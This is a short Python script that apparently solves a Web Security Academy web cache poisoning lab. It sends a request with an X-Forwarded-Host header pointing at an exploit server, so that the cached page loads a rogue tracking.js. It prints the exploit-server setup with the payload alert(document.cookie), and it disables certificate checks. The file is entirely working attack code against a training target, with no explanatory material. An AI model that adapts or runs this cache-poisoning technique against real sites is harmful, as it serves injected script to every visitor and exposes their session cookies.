import http.client
import ssl

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_() -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'x-forwarded-host': f'exploit-{EXPLOIT_SERVER_ID}.exploit-server.net',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


print("Exploit:")
print("File:")
print("/resources/js/tracking.js")
print("Head:")
print(f"""
HTTP/1.1 200
Content-Type: application/javascript; charset=utf-8
""")
print("Body:")
print(f"""
alert(document.cookie);
""")
print()
input("set up exploit and hit enter")
GET_()
